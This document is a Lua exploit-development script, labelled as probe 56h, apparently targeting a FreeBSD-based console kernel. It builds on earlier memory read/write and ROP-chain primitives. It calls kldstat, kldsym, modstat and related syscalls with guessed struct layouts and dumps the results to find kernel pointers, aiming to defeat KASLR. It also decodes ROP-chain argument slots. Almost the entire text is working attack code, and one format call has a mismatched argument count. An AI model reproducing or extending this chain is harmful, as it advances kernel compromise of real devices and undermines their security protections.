-- CRASH_CLASS: MODERATE
-- PROBE 56h: kldstat/kldsym KASLR defeat via ROP chain arg control
--
-- Context: 56c-56g proved controlled CClosure redirect and decoded the
-- full ROP chain layout. fn_addr = libkernel+0xB57, arg slots writable.
-- All conventional KASLR paths are dead. kldstat(308)/kldsym(337) were
-- never properly tested (43a/43b logs incomplete, 53c never ran).
-- kldstat returns kernel module load addresses. kldsym returns kernel
-- symbol addresses. Either one = instant KASLR defeat.
--
-- Strategy:
--   [A] Setup: module bases, arg slot layout verification
--   [B] kldstat(308) with proper struct layout (fileid 1 = kernel)
--   [C] kldsym(337) with KLDSYM_LOOKUP for known kernel symbols
--   [D] modstat(301) / modfind(303) / kldfirstmod(309)
--   [E] Scan kldstat fileids 1-20 if any succeed

print("=== PROBE 56h: KLDSTAT/KLDSYM KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

-- ============================================================
-- [A] Setup
-- ============================================================
print("[A] Setup")

local function get_module_info(handle)
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc = make_syscall(593)
    local ok = pcall(function() sc(uint64(handle), info) end)
    if not ok then return nil end
    local text_lo = safe_rd(info + 0x108)
    local text_hi = safe_rd(info + 0x10C)
    local text_sz_lo = safe_rd(info + 0x110)
    local text_sz_hi = safe_rd(info + 0x114)
    return {
        text_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0)),
        text_size = uint64(string.format("0x%X%08X", text_sz_hi or 0, text_sz_lo or 0)),
        text_lo = text_lo, text_hi = text_hi,
        text_sz_lo = text_sz_lo,
    }
end

local eboot = get_module_info(0)
local libkernel = get_module_info(0x2001)
print("  eboot text:     " .. hexval(eboot and eboot.text_base))
print("  libkernel text: " .. hexval(libkernel and libkernel.text_base))

local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  our PID: " .. our_pid)

-- Parse pipe metadata for ROP chain verification
local pipe_str = tostring(syscall.pipe)
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
print("  fn_addr:  " .. (fn_addr_str or "nil"))
print("  ropchain: " .. (rop_addr_str or "nil"))

-- Verify fn_addr = libkernel+0xB57
if fn_addr_str and libkernel then
    local fn_hi, fn_lo = get_hi_lo(uint64(fn_addr_str))
    local lk_hi, lk_lo = get_hi_lo(libkernel.text_base)
    local offset = fn_lo - lk_lo
    if fn_hi >= 0x80000000 then
        offset = fn_lo - lk_lo
        local fn_nohi = fn_hi - 0x80000000
        print(string.format("  fn_addr offset from libkernel: 0x%X (hi adj: 0x%X)",
            offset, fn_nohi - lk_hi))
    end
end

collectgarbage("stop")

-- ============================================================
-- [B] kldstat(308) — kernel module info with addresses
-- FreeBSD: int kldstat(int fileid, struct kld_file_stat *stat)
-- struct kld_file_stat is ~1088 bytes (0x440)
-- version field at +0x00 must be set to struct size
-- address field is at +0x410 (caddr_t = kernel VA)
-- size field at +0x418
-- ============================================================
print("")
print("[B] kldstat(308) — kernel module load addresses")

local sc_kldstat = make_syscall(308)
local kld_buf = memory.alloc(0x500)

-- Zero the buffer
for i = 0, 0x4FF, 4 do
    safe_wd(kld_buf + i, 0)
end

-- Try different struct sizes (version field)
-- FreeBSD 9: 1088 (0x440), FreeBSD 11+: may differ
local versions = {0x440, 0x438, 0x448, 0x430, 0x450, 0x460, 0x420, 0x400, 0x240, 0x140, 0x100, 0x80, 0x40}

for _, ver in ipairs(versions) do
    -- Clear buffer
    for i = 0, 0x4FF, 4 do
        safe_wd(kld_buf + i, 0)
    end
    -- Set version/size
    safe_wd(kld_buf, ver)

    -- fileid=1 (kernel itself)
    local ok, ret = pcall(function()
        return sc_kldstat(uint64(1), uint64(kld_buf))
    end)

    local r = -999
    if ok then r = to_num(ret) end

    if r ~= -1 and r ~= -999 then
        print(string.format("  *** kldstat(1, ver=0x%X) ret=%d", ver, r))
        -- Dump the buffer for kernel addresses
        print("  Buffer dump:")
        for off = 0, 0x4FF, 8 do
            local val = safe_rq(kld_buf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh ~= 0 or vl ~= 0 then
                    print(string.format("    +0x%03X: %s", off, hexval(val)))
                    if vh >= 0xFFFF8000 then
                        print("      ^^^ KERNEL POINTER!")
                    end
                end
            end
        end
    else
        if r == -999 then
            print(string.format("  kldstat(1, ver=0x%X) CRASHED", ver))
        else
            -- Only print first few failures
            if ver == 0x440 or ver == 0x438 or ver == 0x100 then
                print(string.format("  kldstat(1, ver=0x%X) ret=%d", ver, r))
            end
        end
    end
end

-- Also try fileid=0 (sometimes means "self" or "first")
for _, fid in ipairs({0, 2, 3, -1}) do
    for i = 0, 0x4FF, 4 do safe_wd(kld_buf + i, 0) end
    safe_wd(kld_buf, 0x440)
    local ok, ret = pcall(function()
        return sc_kldstat(uint64(fid), uint64(kld_buf))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    if r ~= -1 and r ~= -999 then
        print(string.format("  *** kldstat(%d, ver=0x440) ret=%d", fid, r))
        for off = 0, 0x4FF, 8 do
            local val = safe_rq(kld_buf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if (vh ~= 0 or vl ~= 0) then
                    print(string.format("    +0x%03X: %s", off, hexval(val)))
                    if vh >= 0xFFFF8000 then
                        print("      ^^^ KERNEL POINTER!")
                    end
                end
            end
        end
    else
        print(string.format("  kldstat(%d, ver=0x440) %s", fid,
            r == -999 and "CRASHED" or ("ret=" .. r)))
    end
end

-- ============================================================
-- [C] kldsym(337) — kernel symbol lookup
-- FreeBSD: int kldsym(int fileid, int cmd, void *data)
-- cmd = KLDSYM_LOOKUP = 0
-- data = struct kld_sym_lookup {
--   int version;       // +0x00: sizeof(struct kld_sym_lookup)
--   char *symname;     // +0x08: pointer to symbol name string
--   u_long symvalue;   // +0x10: OUTPUT — kernel address!
--   size_t symsize;    // +0x18: OUTPUT — symbol size
-- }
-- struct size is typically 0x20 (32 bytes)
-- ============================================================
print("")
print("[C] kldsym(337) — kernel symbol lookup")

local sc_kldsym = make_syscall(337)
local sym_buf = memory.alloc(0x100)
local name_buf = memory.alloc(0x100)

-- Symbols to try: common kernel functions
local symbols = {
    "printf", "copyin", "copyout", "malloc", "free",
    "prison_check", "sysent", "kern_execve",
    "amd64_syscall", "trap", "syscall",
}

for _, symname in ipairs(symbols) do
    -- Write symbol name to name_buf
    for i = 0, #symname do
        local byte = 0
        if i < #symname then byte = string.byte(symname, i + 1) end
        safe_wd(name_buf + i, byte)
    end

    -- Try different struct sizes for version
    for _, ver in ipairs({0x20, 0x28, 0x30, 0x18}) do
        -- Clear sym_buf
        for i = 0, 0x3F, 4 do safe_wd(sym_buf + i, 0) end
        -- Set version
        safe_wd(sym_buf, ver)
        -- Set symname pointer
        safe_wq(sym_buf + 0x08, name_buf)

        -- fileid=0 means kernel
        local ok, ret = pcall(function()
            return sc_kldsym(uint64(0), uint64(0), uint64(sym_buf))
        end)

        local r = -999
        if ok then r = to_num(ret) end

        if r ~= -1 and r ~= -999 then
            local symval = safe_rq(sym_buf + 0x10)
            local symsz = safe_rq(sym_buf + 0x18)
            print(string.format("  *** kldsym('%s', ver=0x%X) ret=%d", symname, ver, r))
            print("    symvalue: " .. hexval(symval))
            print("    symsize:  " .. hexval(symsz))
            local vh, vl = get_hi_lo(symval)
            if vh >= 0xFFFF8000 then
                print("    ^^^ KERNEL ADDRESS FOUND! KASLR DEFEATED!")
            end
        else
            if symname == "printf" then
                print(string.format("  kldsym('%s', fid=0, ver=0x%X) %s",
                    symname, ver, r == -999 and "CRASHED" or ("ret=" .. r)))
            end
        end
    end

    -- Also try fileid=1
    for i = 0, 0x3F, 4 do safe_wd(sym_buf + i, 0) end
    safe_wd(sym_buf, 0x20)
    safe_wq(sym_buf + 0x08, name_buf)
    local ok, ret = pcall(function()
        return sc_kldsym(uint64(1), uint64(0), uint64(sym_buf))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    if r ~= -1 and r ~= -999 then
        local symval = safe_rq(sym_buf + 0x10)
        print(string.format("  *** kldsym('%s', fid=1) ret=%d symval=%s",
            symname, hexval(symval)))
    elseif symname == "printf" then
        print(string.format("  kldsym('%s', fid=1, ver=0x20) %s",
            symname, r == -999 and "CRASHED" or ("ret=" .. r)))
    end
end

-- ============================================================
-- [D] Related kld/mod syscalls
-- kldfirstmod(309): int kldfirstmod(int fileid)
-- modfnext(302): int modfnext(int modid)
-- modfind(303): int modfind(const char *name)
-- modstat(301): int modstat(int modid, struct module_stat *stat)
-- ============================================================
print("")
print("[D] kld/mod auxiliary syscalls")

-- kldfirstmod(309)
local sc_kldfirstmod = make_syscall(309)
for _, fid in ipairs({0, 1, 2, -1}) do
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldfirstmod(%d) %s", fid,
        r == -999 and "CRASHED" or ("ret=" .. r)))
end

-- modfnext(302) — try modid 0,1,2
print("")
local sc_modfnext = make_syscall(302)
for _, mid in ipairs({0, 1, 2, 3}) do
    local ok, ret = pcall(function()
        return sc_modfnext(uint64(mid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfnext(%d) %s", mid,
        r == -999 and "CRASHED" or ("ret=" .. r)))
end

-- modfind(303)
print("")
local sc_modfind = make_syscall(303)
local mod_names = {"kernel", "linuxelf", "linux", "if_lo"}
for _, mname in ipairs(mod_names) do
    for i = 0, #mname do
        local byte = 0
        if i < #mname then byte = string.byte(mname, i + 1) end
        safe_wd(name_buf + i, byte)
    end
    local ok, ret = pcall(function()
        return sc_modfind(uint64(name_buf))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  modfind('%s') %s", mname,
        r == -999 and "CRASHED" or ("ret=" .. r)))
end

-- modstat(301)
-- struct module_stat {
--   int version;       // +0x00
--   char name[MAXMODNAME]; // +0x04 (MAXMODNAME=32)
--   int refs;          // +0x24
--   int id;            // +0x28
--   int data_offset;   // +0x2C? varies
-- }
print("")
local sc_modstat = make_syscall(301)
local mod_buf = memory.alloc(0x200)

for _, mid in ipairs({1, 2, 3, 0}) do
    for i = 0, 0x1FF, 4 do safe_wd(mod_buf + i, 0) end
    -- Try version = sizeof(module_stat), guessing ~0x50-0x100
    for _, ver in ipairs({0x50, 0x58, 0x60, 0x40, 0x30, 0x100, 0x200}) do
        safe_wd(mod_buf, ver)
        local ok, ret = pcall(function()
            return sc_modstat(uint64(mid), uint64(mod_buf))
        end)
        local r = -999
        if ok then r = to_num(ret) end
        if r ~= -1 and r ~= -999 then
            print(string.format("  *** modstat(%d, ver=0x%X) ret=%d", mid, ver, r))
            -- Dump non-zero data
            for off = 0, 0xFF, 8 do
                local val = safe_rq(mod_buf + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh ~= 0 or vl ~= 0 then
                        print(string.format("    +0x%02X: %s", off, hexval(val)))
                        if vh >= 0xFFFF8000 then
                            print("      ^^^ KERNEL POINTER!")
                        end
                    end
                end
            end
        elseif mid == 1 and (ver == 0x50 or ver == 0x100) then
            print(string.format("  modstat(%d, ver=0x%X) %s", mid, ver,
                r == -999 and "CRASHED" or ("ret=" .. r)))
        end
    end
end

-- ============================================================
-- [E] ROP chain arg slot layout verification
-- Verify the arg slot addresses match our analysis:
--   arg_base = fn_addr - 0x1F90
--   +0x00: fn_ptr_source
--   +0x10: rax (syscall_no)
--   +0x20: rdi (arg1)
--   +0x30: rsi (arg2)
--   +0x40: rdx (arg3)
--   +0x50: rcx (arg4)
--   +0x60: r8 (arg5)
--   +0x70: r9 (arg6)
-- ============================================================
print("")
print("[E] ROP chain arg slot layout verification")

if fn_addr_str then
    local fn_addr = uint64(fn_addr_str)
    local fn_h, fn_l = get_hi_lo(fn_addr)
    -- arg_base = fn_addr - 0x1F90 (but fn_addr has 0x8 prefix from tostring)
    -- The actual memory address uses the non-0x8-prefixed form
    -- fn_addr_str like "0x80507cb57" — the 0x8 prefix is part of the address
    -- The arg slots are in the same heap region as the ropchain

    -- Actually compute from ropchain address instead
    local rop_addr = uint64(rop_addr_str)
    local rop_h, rop_l = get_hi_lo(rop_addr)

    -- From analysis: first arg slot loaded is at rop_addr - 0x20B0 (for fn_ptr)
    -- Actually: arg_base is NOT relative to fn_addr in simple way
    -- Let me read the actual addresses from the ROP chain itself

    -- The chain at rop_addr+0x08 is "pop rax; ret"
    -- rop_addr+0x10 is the value loaded = arg slot for fn_ptr_source
    local fn_ptr_slot = safe_rq(rop_addr + 0x10)
    print("  fn_ptr_source slot: " .. hexval(fn_ptr_slot))
    if fn_ptr_slot then
        local fv = safe_rq(fn_ptr_slot)
        print("  *fn_ptr_source:     " .. hexval(fv))
    end

    -- Read the rdi slot (arg1) from chain
    -- Chain structure: after fn_ptr load+store and return_addr setup,
    -- then r9 load. Let me read a few key slots from chain.

    -- The chain loads from addresses that are in the chain data itself
    -- Let me dump all the indirect load addresses
    print("")
    print("  Decoding arg slot addresses from ROP chain:")

    -- Walk the chain and extract the load-from addresses
    -- Pattern: pop rax;ret + addr + mov rax,[rax];ret
    local slot_addrs = {}
    local i = 0
    while i < 0x300 do
        local gadget = safe_rd(rop_addr + i)
        -- Look for pattern: value that's in heap range (potential arg slot addr)
        local val = safe_rq(rop_addr + i)
        if val then
            local vh, vl = get_hi_lo(val)
            -- If this looks like a heap address near the rop chain
            if vh == rop_h and vl > (rop_l - 0x3000) and vl < (rop_l + 0x6000) then
                local target_val = safe_rq(val)
                if target_val then
                    local tvh, tvl = get_hi_lo(target_val)
                    if tvh ~= 0 or tvl ~= 0 then
                        slot_addrs[#slot_addrs + 1] = {
                            chain_off = i,
                            slot_addr = val,
                            slot_val = target_val
                        }
                    end
                end
            end
        end
        i = i + 8
    end

    print(string.format("  Found %d heap references in chain:", #slot_addrs))
    for _, s in ipairs(slot_addrs) do
        print(string.format("    chain+0x%03X -> %s = %s",
            s.chain_off, hexval(s.slot_addr), hexval(s.slot_val)))
    end
end

-- ============================================================
-- [F] Direct make_syscall test for kldnext(304)
-- kldnext iterates loaded kernel modules
-- Returns next fileid or 0 for end
-- ============================================================
print("")
print("[F] kldnext(304) — iterate kernel modules")

local sc_kldnext = make_syscall(304)
local fid = 0
for attempt = 1, 10 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(fid))
    end)
    local r = -999
    if ok then r = to_num(ret) end
    print(string.format("  kldnext(%d) %s", fid,
        r == -999 and "CRASHED" or ("ret=" .. r)))
    if r <= 0 or r == -999 then break end
    fid = r
end

collectgarbage("restart")

print("")
print("=== PROBE 56h COMPLETE ===")
